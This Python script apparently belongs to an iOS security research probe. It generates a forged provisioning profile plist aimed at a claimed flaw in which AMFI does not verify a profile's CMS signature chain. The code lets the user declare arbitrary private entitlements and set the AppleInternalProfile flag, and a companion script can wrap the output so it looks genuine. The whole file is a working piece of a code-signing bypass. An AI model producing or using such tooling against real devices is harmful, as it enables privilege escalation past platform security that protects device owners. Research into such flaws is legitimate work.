#!/usr/bin/env python3
"""
make_profile.py — craft the `embedded.mobileprovision` the probe carries.

The static analysis of the AMFI kext on iOS 27.0.1 showed that the kernel
never verifies a provisioning profile's own CMS chain: the profile is DER/plist
parsed and only a handful of dictionary keys are inspected
(`Entitlements`, `UUID`, `AppleInternalProfile`, `DeveloperCertificates`,
`ProvisionedDevices`).  The profile itself is handed to the kernel by `amfid`.

This script builds such a profile.  It writes a plain plist; `resign.sh`
optionally wraps it in a real CMS container with the developer's own identity
so that the file has the same *shape* as a genuine mobileprovision.

    ./scripts/make_profile.py --out profile.plist \
        --entitlement com.apple.private.mobileinstall.allowedSPI \
        --apple-internal
"""

import argparse
import datetime
import plistlib
import uuid
import sys


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", required=True)
    ap.add_argument("--entitlement", action="append", default=[],
                    help="entitlement key to declare (repeatable)")
    ap.add_argument("--team-id", default="")
    ap.add_argument("--bundle-id", default="com.research.ios27.privprobe")
    ap.add_argument("--app-id", default="", help="App ID pattern; defaults to <team>.* ")
    ap.add_argument("--dev-cert", default="",
                    help="DER or PEM of the signing certificate, embedded in DeveloperCertificates")
    ap.add_argument("--apple-internal", action="store_true",
                    help="set AppleInternalProfile = true")
    ap.add_argument("--uuid", default="")
    ap.add_argument("--days", type=int, default=365)
    args = ap.parse_args()

    now = datetime.datetime.now(datetime.timezone.utc)

    # The App ID and the identity entitlements have to match the bundle, or
    # the install is rejected before any of this is interesting.
    app_id = args.app_id or (f"{args.team_id}.*" if args.team_id else "*")

    entitlements = {k: True for k in args.entitlement}
    if args.team_id:
        entitlements.setdefault("application-identifier", f"{args.team_id}.{args.bundle_id}")
        entitlements.setdefault("keychain-access-groups", [f"{args.team_id}.*"])
        entitlements.setdefault("com.apple.developer.team-identifier", args.team_id)
        entitlements.setdefault("get-task-allow", True)

    dev_certs = []
    if args.dev_cert:
        raw = open(args.dev_cert, "rb").read()
        if raw[:1] != b"\x30":                      # PEM -> DER
            import base64, re as _re
            body = _re.search(rb"-----BEGIN CERTIFICATE-----(.+?)-----END CERTIFICATE-----",
                              raw, _re.S)
            if body:
                raw = base64.b64decode(_re.sub(rb"\s+", b"", body.group(1)))
        dev_certs = [raw]

    profile = {
        "AppIDName": "Probe",
        "EntitlementAppID": app_id,
        "ApplicationIdentifierPrefix": [args.team_id] if args.team_id else [],
        "CreationDate": now,
        "Platform": ["iOS"],
        "DeveloperCertificates": dev_certs,
        "Entitlements": entitlements,
        "ExpirationDate": now + datetime.timedelta(days=args.days),
        "Name": "Probe Profile",
        "TeamIdentifier": [args.team_id] if args.team_id else [],
        "TeamName": "",
        "TimeToLive": args.days,
        "UUID": args.uuid or str(uuid.uuid4()).upper(),
        "Version": 1,
        "ProvisionedDevices": [],
    }
    if args.apple_internal:
        profile["AppleInternalProfile"] = True

    with open(args.out, "wb") as f:
        plistlib.dump(profile, f, fmt=plistlib.FMT_XML)

    print(f"wrote {args.out}")
    print(f"  app-id       : {app_id}")
    print(f"  entitlements : {sorted(profile['Entitlements'])}")
    print(f"  apple-internal: {args.apple_internal}")
    print(f"  uuid         : {profile['UUID']}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
